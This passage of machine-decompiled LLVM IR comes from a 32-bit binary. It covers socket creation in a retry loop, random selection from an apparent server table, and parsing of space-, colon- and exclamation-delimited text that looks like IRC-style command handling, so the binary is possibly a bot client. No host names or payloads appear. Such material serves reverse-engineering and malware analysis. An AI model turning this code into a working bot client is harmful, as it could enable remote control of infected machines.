  store i32 %v2_8049df9, i32* @eax, align 4
  %v1_8049e01 = call i32 @function_804e754(i32 %v2_8049df9)
  store i32 2, i32* %stack_var_-168, align 4
  store i8* %stack_var_-100, i8** %stack_var_-204, align 4
  %v5_8049ea2 = call i32 @function_80489a9(i16* %tmp77, i32 20)
  store i8* %stack_var_-100, i8** %stack_var_-204, align 4
  %v5_8049ebc = call i32 @function_80489a9(i16* %tmp77, i32 40)
  store i32 %v0_8049d78, i32* %stack_var_-152, align 4
  store i8* inttoptr (i32 1420 to i8*), i8** %stack_var_-204, align 4
  %v3_8049ef6 = call i32 @function_804d468(i16 1420)
  store i8* %tmp78, i8** %stack_var_-204, align 4
  %v5_8049f23 = call i32 @function_804d334(i32 %v15_8049f11, i32 %v2_8049f0b, i32 20)
  store i8* %tmp76, i8** %stack_var_-204, align 4
  %v5_8049f45 = call i32 @function_804d334(i32 %v15_8049d2d, i32 %v3_8049f45, i32 1400)
  store i8* %tmp79, i8** %stack_var_-204, align 4
  %v5_8049f5d = call i32 @function_80489a9(i16* %tmp80, i32 1432)
  store i8* %v4_8049f97, i8** %stack_var_-204, align 4
  %v8_8049f9a = call i32 @function_804d9d8(i32 %v5_8049ce1, i32 %v2_8049d2a, i32 1440, i32 0, i32 %v2_8049f69, i32 16)
  %tmp = icmp ult i32 %stack_var_-32.0, 50
  br i1 %tmp, label %dec_label_pc_8049fc4, label %dec_label_pc_8049fa5

dec_label_pc_8049fa5:                             ; preds = %dec_label_pc_8049d78
  store i8* null, i8** %stack_var_-204, align 4
  %v3_8049fac = call i32 @function_804b750(i32* null)
  %v7_8049fb9 = icmp ult i32 %v3_8049fac, %v5_8049fb6
  %v1_8049fbb = icmp eq i1 %v7_8049fb9, false
  br i1 %v1_8049fbb, label %dec_label_pc_8049fcc, label %dec_label_pc_8049fc4

dec_label_pc_8049fc4:                             ; preds = %dec_label_pc_8049fa5, %dec_label_pc_8049d78
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049d78 ], [ 0, %dec_label_pc_8049fa5 ]
  %v4_8049fc4 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_8049d78

dec_label_pc_8049fcc:                             ; preds = %dec_label_pc_8049fa5
  store i8* %v4_8049f97, i8** %stack_var_-204, align 4
  %v2_8049fd2 = call i32 @function_804b5f4(i32 %v5_8049ce1)
  store i32 %v2_8049fd2, i32* @eax, align 4
  store i8* null, i8** %stack_var_-204, align 4
  %v2_8049fde = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8049fe3

dec_label_pc_8049fe3:                             ; preds = %dec_label_pc_8049c58, %dec_label_pc_8049fcc
  %v0_8049feb = phi i32 [ %v2_8049c7e, %dec_label_pc_8049c58 ], [ %v2_8049fde, %dec_label_pc_8049fcc ]
  ret i32 %v0_8049feb

; uselistorder directives
  uselistorder i32 %v1_8049de6, { 2, 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 0 }
  uselistorder i32 %v5_8049ce1, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_8049c8b, { 1, 0 }
  uselistorder i8** %stack_var_-204, { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 23, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-100, { 0, 2, 4, 1, 3 }
  uselistorder i32* %stack_var_-152, { 2, 0, 1 }
  uselistorder i32* %stack_var_-80, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_804d9d8, { 2, 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_80483ee, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_8049520, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804ead8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_8048311, { 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049fe3, { 1, 0 }
  uselistorder label %dec_label_pc_8049cfb, { 1, 0 }
  uselistorder label %dec_label_pc_8049cb7, { 1, 0 }
}

define i32 @function_804aaaa(i32 %arg1) local_unnamed_addr {
dec_label_pc_804aaaa:
  %stack_var_-4 = alloca i32, align 4
  %v0_804aaaa = load i32, i32* @ebp, align 4
  store i32 %v0_804aaaa, i32* %stack_var_-4, align 4
  %v4_804aaaa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804aaaa, i32* @ebp, align 4
  %v3_804aac7 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_8052fcd.90 to i32))
  %v3_804aaed = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_8052fda.92 to i32))
  %v3_804ab09 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_8052fe7.93 to i32))
  ret i32 %v3_804ab09

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @function_804ab10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ab10:
  %stack_var_-4 = alloca i32, align 4
  %v0_804ab10 = load i32, i32* @ebp, align 4
  store i32 %v0_804ab10, i32* %stack_var_-4, align 4
  %v4_804ab10 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ab10, i32* @ebp, align 4
  %v3_804ab2b = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8052fef.94 to i32))
  ret i32 %v3_804ab2b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804ab32(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804ab32:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_804ab56.preheader

dec_label_pc_804ab50:                             ; preds = %dec_label_pc_804ab75
  %v5_804ab50 = add i32 %.pre34, 1
  %v22_804ab50 = inttoptr i32 %v5_804ab50 to i8*
  %v4_804ab53 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804ab56

dec_label_pc_804ab56:                             ; preds = %dec_label_pc_804ab56.preheader, %dec_label_pc_804ab50
  %stack_var_-28.0 = phi i32 [ %v4_804ab53, %dec_label_pc_804ab50 ], [ %stack_var_-28.170, %dec_label_pc_804ab56.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_804ab50, %dec_label_pc_804ab50 ], [ %stack_var_-20.171, %dec_label_pc_804ab56.preheader ]
  %v3_804ab6a = call i32 @_strlen(i8* %arg2)
  %v7_804ab71 = icmp ult i32 %stack_var_-28.0, %v3_804ab6a
  %v1_804ab73 = icmp eq i1 %v7_804ab71, false
  %.pre34 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_804ab73, label %dec_label_pc_804ab7f, label %dec_label_pc_804ab75

dec_label_pc_804ab75:                             ; preds = %dec_label_pc_804ab56
  %v2_804ab78 = load i8, i8* %stack_var_-20.0, align 1
  %v7_804ab7b = icmp eq i8 %v2_804ab78, 32
  %v1_804ab7d = icmp eq i1 %v7_804ab7b, false
  br i1 %v1_804ab7d, label %dec_label_pc_804ab50, label %dec_label_pc_804ab7f

dec_label_pc_804ab7f:                             ; preds = %dec_label_pc_804ab56, %dec_label_pc_804ab75
  %v5_804ab7f = add i32 %.pre34, 1
  %v3_804ab96 = call i32 @_strlen(i8* %arg2)
  %v4_804ab96 = mul i32 %v3_804ab96, -1
  %v1_804ab9c = sub i32 0, %v4_804ab96
  %v2_804ab9d = sub i32 0, %v4_804ab96
  %v12_804ab9d = icmp eq i32 %stack_var_-28.0, %v2_804ab9d
  br i1 %v12_804ab9d, label %dec_label_pc_804ad75, label %dec_label_pc_804aba5

dec_label_pc_804aba5:                             ; preds = %dec_label_pc_804ab7f
  %v22_804ab7f = inttoptr i32 %v5_804ab7f to i8*
  %v4_804aba5 = add nuw nsw i32 %storemerge972, 1
  %v7_804abac = icmp sgt i32 %storemerge972, 3
  br i1 %v7_804abac, label %dec_label_pc_804abba.preheader, label %dec_label_pc_804ab56.preheader

dec_label_pc_804ab56.preheader:                   ; preds = %dec_label_pc_804ab32, %dec_label_pc_804aba5
  %storemerge972 = phi i32 [ 0, %dec_label_pc_804ab32 ], [ %v4_804aba5, %dec_label_pc_804aba5 ]
  %stack_var_-20.171 = phi i8* [ %arg2, %dec_label_pc_804ab32 ], [ %v22_804ab7f, %dec_label_pc_804aba5 ]
  %stack_var_-28.170 = phi i32 [ 0, %dec_label_pc_804ab32 ], [ %stack_var_-28.0, %dec_label_pc_804aba5 ]
  br label %dec_label_pc_804ab56

dec_label_pc_804abba.preheader:                   ; preds = %dec_label_pc_804aba5
  br label %dec_label_pc_804abba

dec_label_pc_804abb7:                             ; preds = %dec_label_pc_804abd9
  %v4_804abb7 = add i32 %storemerge8, 1
  br label %dec_label_pc_804abba

dec_label_pc_804abba:                             ; preds = %dec_label_pc_804abba.preheader, %dec_label_pc_804abb7
  %storemerge8 = phi i32 [ %v4_804abb7, %dec_label_pc_804abb7 ], [ 0, %dec_label_pc_804abba.preheader ]
  %v3_804abce = call i32 @_strlen(i8* %v22_804ab7f)
  %v7_804abd5 = icmp ult i32 %storemerge8, %v3_804abce
  %v1_804abd7 = icmp eq i1 %v7_804abd5, false
  %.pre = add i32 %storemerge8, %v5_804ab7f
  br i1 %v1_804abd7, label %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge, label %dec_label_pc_804abd9

dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge: ; preds = %dec_label_pc_804abba
  %.pre23 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804abe6

dec_label_pc_804abd9:                             ; preds = %dec_label_pc_804abba
  %v1_804abdf = inttoptr i32 %.pre to i8*
  %v2_804abdf = load i8, i8* %v1_804abdf, align 1
  %v7_804abe2 = icmp eq i8 %v2_804abdf, 32
  %v1_804abe4 = icmp eq i1 %v7_804abe2, false
  br i1 %v1_804abe4, label %dec_label_pc_804abb7, label %dec_label_pc_804abe6

dec_label_pc_804abe6:                             ; preds = %dec_label_pc_804abd9, %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge
  %v1_804abec.pre-phi = phi i8* [ %.pre23, %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge ], [ %v1_804abdf, %dec_label_pc_804abd9 ]
  store i8 0, i8* %v1_804abec.pre-phi, align 1
  %v0_804abef = load i32, i32* @global_var_80585c4.80, align 4
  %v3_804abfe = call i32 @function_804d34c(i8* %v22_804ab7f, i32 %v0_804abef)
  %v1_804ac03 = icmp eq i32 %v3_804abfe, 0
  %v1_804ac05 = icmp eq i1 %v1_804ac03, false
  br i1 %v1_804ac05, label %dec_label_pc_804ad75, label %dec_label_pc_804ac0b

dec_label_pc_804ac0b:                             ; preds = %dec_label_pc_804abe6
  %v0_804ac0b = load i64, i64* @global_var_8055e0c.12, align 8
  %v1_804ac0b = trunc i64 %v0_804ac0b to i32
  %v1_804ac10 = icmp eq i32 %v1_804ac0b, 0
  %v1_804ac12 = icmp eq i1 %v1_804ac10, false
  br i1 %v1_804ac12, label %dec_label_pc_804ad75, label %dec_label_pc_804ac18

dec_label_pc_804ac18:                             ; preds = %dec_label_pc_804ac0b
  br label %dec_label_pc_804ac34.preheader

dec_label_pc_804ac2e:                             ; preds = %dec_label_pc_804ac53
  %v5_804ac2e = add i32 %.pre33, 1
  %v22_804ac2e = inttoptr i32 %v5_804ac2e to i8*
  %v4_804ac31 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_804ac34

dec_label_pc_804ac34:                             ; preds = %dec_label_pc_804ac34.preheader, %dec_label_pc_804ac2e
  %stack_var_-28.2 = phi i32 [ %v4_804ac31, %dec_label_pc_804ac2e ], [ %stack_var_-28.367, %dec_label_pc_804ac34.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_804ac2e, %dec_label_pc_804ac2e ], [ %stack_var_-20.368, %dec_label_pc_804ac34.preheader ]
  %v3_804ac48 = call i32 @_strlen(i8* %arg2)
  %v7_804ac4f = icmp ult i32 %stack_var_-28.2, %v3_804ac48
  %v1_804ac51 = icmp eq i1 %v7_804ac4f, false
  %.pre33 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_804ac51, label %dec_label_pc_804ac5d, label %dec_label_pc_804ac53

dec_label_pc_804ac53:                             ; preds = %dec_label_pc_804ac34
  %v2_804ac56 = load i8, i8* %stack_var_-20.2, align 1
  %v7_804ac59 = icmp eq i8 %v2_804ac56, 32
  %v1_804ac5b = icmp eq i1 %v7_804ac59, false
  br i1 %v1_804ac5b, label %dec_label_pc_804ac2e, label %dec_label_pc_804ac5d

dec_label_pc_804ac5d:                             ; preds = %dec_label_pc_804ac34, %dec_label_pc_804ac53
  %v5_804ac5d = add i32 %.pre33, 1
  %v3_804ac74 = call i32 @_strlen(i8* %arg2)
  %v4_804ac74 = mul i32 %v3_804ac74, -1
  %v1_804ac7a = sub i32 0, %v4_804ac74
  %v2_804ac7b = sub i32 0, %v4_804ac74
  %v12_804ac7b = icmp eq i32 %stack_var_-28.2, %v2_804ac7b
  br i1 %v12_804ac7b, label %dec_label_pc_804ad75, label %dec_label_pc_804ac83

dec_label_pc_804ac83:                             ; preds = %dec_label_pc_804ac5d
  %v22_804ac5d = inttoptr i32 %v5_804ac5d to i8*
  %v4_804ac83 = add nuw nsw i32 %storemerge769, 1
  %v7_804ac8a = icmp sgt i32 %storemerge769, 1
  br i1 %v7_804ac8a, label %dec_label_pc_804ac98.preheader, label %dec_label_pc_804ac34.preheader

dec_label_pc_804ac34.preheader:                   ; preds = %dec_label_pc_804ac18, %dec_label_pc_804ac83
  %storemerge769 = phi i32 [ 0, %dec_label_pc_804ac18 ], [ %v4_804ac83, %dec_label_pc_804ac83 ]
  %stack_var_-20.368 = phi i8* [ %arg2, %dec_label_pc_804ac18 ], [ %v22_804ac5d, %dec_label_pc_804ac83 ]
  %stack_var_-28.367 = phi i32 [ 0, %dec_label_pc_804ac18 ], [ %stack_var_-28.2, %dec_label_pc_804ac83 ]
  br label %dec_label_pc_804ac34

dec_label_pc_804ac98.preheader:                   ; preds = %dec_label_pc_804ac83
  br label %dec_label_pc_804ac98

dec_label_pc_804ac95:                             ; preds = %dec_label_pc_804acb7
  %v4_804ac95 = add i32 %storemerge, 1
  br label %dec_label_pc_804ac98

dec_label_pc_804ac98:                             ; preds = %dec_label_pc_804ac98.preheader, %dec_label_pc_804ac95
  %storemerge = phi i32 [ %v4_804ac95, %dec_label_pc_804ac95 ], [ 0, %dec_label_pc_804ac98.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804ac5d, i32* @edi, align 4
  %v3_804acac = call i32 @_strlen(i8* %v22_804ac5d)
  %v0_804acb3 = load i32, i32* @edx, align 4
  %v7_804acb3 = icmp ult i32 %v0_804acb3, %v3_804acac
  %v1_804acb5 = icmp eq i1 %v7_804acb3, false
  %.pre24 = add i32 %storemerge, %v5_804ac5d
  br i1 %v1_804acb5, label %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge, label %dec_label_pc_804acb7

dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge: ; preds = %dec_label_pc_804ac98
  %.pre31 = inttoptr i32 %.pre24 to i8*
  br label %dec_label_pc_804acc4

dec_label_pc_804acb7:                             ; preds = %dec_label_pc_804ac98
  %v1_804acbd = inttoptr i32 %.pre24 to i8*
  %v2_804acbd = load i8, i8* %v1_804acbd, align 1
  %v7_804acc0 = icmp eq i8 %v2_804acbd, 32
  %v1_804acc2 = icmp eq i1 %v7_804acc0, false
  br i1 %v1_804acc2, label %dec_label_pc_804ac95, label %dec_label_pc_804acc4

dec_label_pc_804acc4:                             ; preds = %dec_label_pc_804acb7, %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge
  %v1_804acca.pre-phi = phi i8* [ %.pre31, %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge ], [ %v1_804acbd, %dec_label_pc_804acb7 ]
  store i8 0, i8* %v1_804acca.pre-phi, align 1
  %v1_804acd3 = call i32 @function_804d570(i32 %v5_804ac5d)
  %v2_804acd3 = trunc i32 %v1_804acd3 to i8
  store i8 %v2_804acd3, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_804acd3, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804ace1 = icmp eq i1 %tmp, false
  br i1 %v1_804ace1, label %dec_label_pc_804acc4._crit_edge, label %dec_label_pc_804ace3

dec_label_pc_804acc4._crit_edge:                  ; preds = %dec_label_pc_804acc4
  br label %bb

dec_label_pc_804ace3:                             ; preds = %dec_label_pc_804acc4
  %v1_804ace9 = call i32 @function_804d598(i32 %v5_804ac5d)
  %v4_804acf1 = icmp eq i32 %v1_804ace9, 0
  %v1_804acf5 = icmp eq i1 %v4_804acf1, false
  br i1 %v1_804acf5, label %dec_label_pc_804ad15, label %dec_label_pc_804acf7

dec_label_pc_804acf7:                             ; preds = %dec_label_pc_804ace3
  %v2_804ad0e = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_8052ff8.95 to i32))
  br label %dec_label_pc_804ad75

dec_label_pc_804ad15:                             ; preds = %dec_label_pc_804ace3
  %v1_804ad18 = add i32 %v1_804ace9, 12
  %v2_804ad18 = inttoptr i32 %v1_804ad18 to i32*
  %v3_804ad18 = load i32, i32* %v2_804ad18, align 4
  %v1_804ad20 = add i32 %v1_804ace9, 16
  %v2_804ad20 = inttoptr i32 %v1_804ad20 to i32*
  %v3_804ad20 = load i32, i32* %v2_804ad20, align 4
  %v1_804ad23 = inttoptr i32 %v3_804ad20 to i32*
  %v2_804ad23 = load i32, i32* %v1_804ad23, align 4
  %v1_804ad2a = inttoptr i32 %v2_804ad23 to i8*
  %v7_804ad2d = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_804ad2a, i32 %v3_804ad18)
  %v2_804ad3a.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_804acc4._crit_edge, %dec_label_pc_804ad15
  %v2_804ad3a = phi i8 [ %v2_804acd3, %dec_label_pc_804acc4._crit_edge ], [ %v2_804ad3a.pre, %dec_label_pc_804ad15 ]
  store i8 %v2_804ad3a, i8* bitcast (i8** @global_var_8055e0b.96 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8055e08.11 to i8*), align 4
  store i64 256, i64* @global_var_8055e0c.12, align 8
  br label %dec_label_pc_804ad75

dec_label_pc_804ad75:                             ; preds = %dec_label_pc_804ab7f, %dec_label_pc_804ac5d, %dec_label_pc_804ac0b, %dec_label_pc_804abe6, %dec_label_pc_804acf7, %bb
  %v0_804ad7b = phi i32 [ %v1_804ac0b, %dec_label_pc_804ac0b ], [ %v3_804abfe, %dec_label_pc_804abe6 ], [ %v2_804ad0e, %dec_label_pc_804acf7 ], [ ptrtoint (i8** @global_var_8055e08.11 to i32), %bb ], [ %v1_804ac7a, %dec_label_pc_804ac5d ], [ %v1_804ab9c, %dec_label_pc_804ab7f ]
  ret i32 %v0_804ad7b

; uselistorder directives
  uselistorder i32 %.pre24, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge769, { 1, 0 }
  uselistorder i32 %v5_804ac5d, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0, 2 }
  uselistorder i32 %storemerge972, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_8055e08.11, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_80482b3, { 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i64* @global_var_8055e0c.12, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_804ad75, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_804ac98, { 1, 0 }
  uselistorder label %dec_label_pc_804ac34.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ac5d, { 1, 0 }
  uselistorder label %dec_label_pc_804abba, { 1, 0 }
  uselistorder label %dec_label_pc_804ab56.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ab7f, { 1, 0 }
}

define i32 @function_804ad7c() local_unnamed_addr {
dec_label_pc_804ad7c:
  %stack_var_-4 = alloca i32, align 4
  %v0_804ad7c = load i32, i32* @ebp, align 4
  store i32 %v0_804ad7c, i32* %stack_var_-4, align 4
  %v4_804ad7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ad7c, i32* @ebp, align 4
  %v0_804ad82 = load i32, i32* @global_var_80585c4.80, align 4
  %v1_804ad8a = call i32 @function_804e481(i32 %v0_804ad82)
  store i32 %v1_804ad8a, i32* @eax, align 4
  %v0_804ad8f = call i32 @function_80484c9()
  store i32 %v0_804ad8f, i32* @global_var_80585c4.80, align 4
  ret i32 %v0_804ad8f

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804ad9b(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ad9b:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %v4_804adb1 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804adae

dec_label_pc_804adab:                             ; preds = %dec_label_pc_804adcd
  %v4_804adab = add i32 %storemerge, 1
  br label %dec_label_pc_804adae

dec_label_pc_804adae:                             ; preds = %dec_label_pc_804ad9b, %dec_label_pc_804adab
  %storemerge = phi i32 [ %v4_804adab, %dec_label_pc_804adab ], [ 0, %dec_label_pc_804ad9b ]
  store i1 false, i1* @df, align 1
  store i32 %v4_804adb1, i32* @edi, align 4
  %v3_804adc2 = call i32 @_strlen(i8* %arg1)
  %v7_804adc9 = icmp ult i32 %storemerge, %v3_804adc2
  %v1_804adcb = icmp eq i1 %v7_804adc9, false
  %.pre = add i32 %storemerge, %v4_804adb1
  br i1 %v1_804adcb, label %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge, label %dec_label_pc_804adcd

dec_label_pc_804adae.dec_label_pc_804adda_crit_edge: ; preds = %dec_label_pc_804adae
  %.pre11 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804adda

dec_label_pc_804adcd:                             ; preds = %dec_label_pc_804adae
  %v1_804add3 = inttoptr i32 %.pre to i8*
  %v2_804add3 = load i8, i8* %v1_804add3, align 1
  %v10_804add6 = icmp eq i8 %v2_804add3, 33
  %v1_804add8 = icmp eq i1 %v10_804add6, false
  br i1 %v1_804add8, label %dec_label_pc_804adab, label %dec_label_pc_804adda

dec_label_pc_804adda:                             ; preds = %dec_label_pc_804adcd, %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge
  %v1_804ade0.pre-phi = phi i8* [ %.pre11, %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge ], [ %v1_804add3, %dec_label_pc_804adcd ]
  store i8 0, i8* %v1_804ade0.pre-phi, align 1
  %v0_804ade3 = load i32, i32* @global_var_80585c4.80, align 4
  %v3_804adf2 = call i32 @function_804d34c(i8* %arg1, i32 %v0_804ade3)
  %v1_804adf7 = icmp eq i32 %v3_804adf2, 0
  %v1_804adf9 = icmp eq i1 %v1_804adf7, false
  br i1 %v1_804adf9, label %dec_label_pc_804ae2e, label %dec_label_pc_804adfb

dec_label_pc_804adfb:                             ; preds = %dec_label_pc_804adda
  %v2_804adfe = load i8, i8* %tmp12, align 1
  %v10_804ae01 = icmp eq i8 %v2_804adfe, 58
  %v1_804ae03 = icmp eq i1 %v10_804ae01, false
  br i1 %v1_804ae03, label %dec_label_pc_804ae08, label %dec_label_pc_804ae05

dec_label_pc_804ae05:                             ; preds = %dec_label_pc_804adfb
  %v5_804ae05 = add i32 %arg2, 1
  %v22_804ae05 = inttoptr i32 %v5_804ae05 to i8*
  br label %dec_label_pc_804ae08

dec_label_pc_804ae08:                             ; preds = %dec_label_pc_804adfb, %dec_label_pc_804ae05
  %stack_var_12.0 = phi i8* [ %tmp12, %dec_label_pc_804adfb ], [ %v22_804ae05, %dec_label_pc_804ae05 ]
  %v0_804ae08 = load i32, i32* @global_var_80585c4.80, align 4
  %v1_804ae0d = icmp eq i32 %v0_804ae08, 0
  br i1 %v1_804ae0d, label %dec_label_pc_804ae1e, label %dec_label_pc_804ae11

dec_label_pc_804ae11:                             ; preds = %dec_label_pc_804ae08
  %v1_804ae19 = call i32 @function_804e481(i32 %v0_804ae08)
  br label %dec_label_pc_804ae1e

dec_label_pc_804ae1e:                             ; preds = %dec_label_pc_804ae08, %dec_label_pc_804ae11
  %v4_804ae1e = ptrtoint i8* %stack_var_12.0 to i32
  %v1_804ae24 = call i32 @function_804d384(i32 %v4_804ae1e)
  store i32 %v1_804ae24, i32* @global_var_80585c4.80, align 4
  br label %dec_label_pc_804ae2e

dec_label_pc_804ae2e:                             ; preds = %dec_label_pc_804adda, %dec_label_pc_804ae1e
  %v0_804ae33 = phi i32 [ %v3_804adf2, %dec_label_pc_804adda ], [ %v1_804ae24, %dec_label_pc_804ae1e ]
  ret i32 %v0_804ae33

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ae2e, { 1, 0 }
  uselistorder label %dec_label_pc_804ae1e, { 1, 0 }
  uselistorder label %dec_label_pc_804ae08, { 1, 0 }
  uselistorder label %dec_label_pc_804adae, { 1, 0 }
}

define i32 @function_804ae34() local_unnamed_addr {
dec_label_pc_804ae34:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ae34 = load i32, i32* @ebp, align 4
  store i32 %v0_804ae34, i32* %stack_var_-4, align 4
  %v4_804ae34 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ae34, i32* @ebp, align 4
  %v2_804af0a = ptrtoint i32* %stack_var_-32 to i32
  %v2_804af0d = ptrtoint i32* %stack_var_-28 to i32
  %v2_804af59 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_804ae3c

dec_label_pc_804ae3c:                             ; preds = %dec_label_pc_804ae3c.backedge, %dec_label_pc_804ae34
  store i32 -1, i32* @global_var_80585c8.7, align 8
  store i32 1, i32* %stack_var_-36, align 4
  %v0_804ae4d = load i32, i32* @global_var_8055e00.60, align 512
  store i32 %v0_804ae4d, i32* @eax, align 4
  %v1_804ae52 = icmp eq i32 %v0_804ae4d, 0
  %v1_804ae54 = icmp eq i1 %v1_804ae52, false
  br i1 %v1_804ae54, label %dec_label_pc_804ae79, label %dec_label_pc_804ae56

dec_label_pc_804ae56:                             ; preds = %dec_label_pc_804ae3c
  %v1_804ae56 = call i32 @function_804e754(i32 1)
  %v0_804ae5d = load i64, i64* @global_var_8055a60.99, align 8
  %sext = mul i64 %v0_804ae5d, 4294967296
  %v5_804ae62 = sdiv i64 %sext, 4294967296
  %v1_804ae67 = ashr i32 %v1_804ae56, 31
  %v6_804ae68 = zext i32 %v1_804ae56 to i64
  %v8_804ae68 = zext i32 %v1_804ae67 to i64
  %v9_804ae68 = mul nuw i64 %v8_804ae68, 4294967296
  %v10_804ae68 = or i64 %v9_804ae68, %v6_804ae68
  %v14_804ae68 = srem i64 %v10_804ae68, %v5_804ae62
  %v15_804ae68 = trunc i64 %v14_804ae68 to i32
  %v1_804ae6d = mul i32 %v15_804ae68, 4
  %v2_804ae6d = add i32 %v1_804ae6d, ptrtoint ([16 x i8]** @global_var_8055a64.101 to i32)
  %v3_804ae6d = inttoptr i32 %v2_804ae6d to i32*
  %v4_804ae6d = load i32, i32* %v3_804ae6d, align 4
  store i32 %v4_804ae6d, i32* @global_var_80586e0.59, align 32
  br label %dec_label_pc_804ae79

dec_label_pc_804ae79:                             ; preds = %dec_label_pc_804ae3c, %dec_label_pc_804ae56
  store i32 0, i32* @global_var_8055e00.60, align 512
  br label %dec_label_pc_804ae83

dec_label_pc_804ae83:                             ; preds = %dec_label_pc_804ae83, %dec_label_pc_804ae79
  store i32 2, i32* %stack_var_-60, align 4
  %v3_804ae9a = call i32 @function_804da58(i32 2, i32 1, i32 6)
  store i32 %v3_804ae9a, i32* @global_var_80585c8.7, align 8
  %v2_804aea9 = icmp slt i32 %v3_804ae9a, 0
  br i1 %v2_804aea9, label %dec_label_pc_804ae83, label %dec_label_pc_804aead

dec_label_pc_804aead:                             ; preds = %dec_label_pc_804ae83
  %v0_804aead = load i32, i32* @global_var_80586e0.59, align 32
  store i32 %v0_804aead, i32* %stack_var_-60, align 4
  %v1_804aeb5 = call i32 @function_804d570(i32 %v0_804aead)
  %v1_804aeba = icmp eq i32 %v1_804aeb5, 0
  br i1 %v1_804aeba, label %dec_label_pc_804aed0, label %dec_label_pc_804aebe

dec_label_pc_804aebe:                             ; preds = %dec_label_pc_804aead
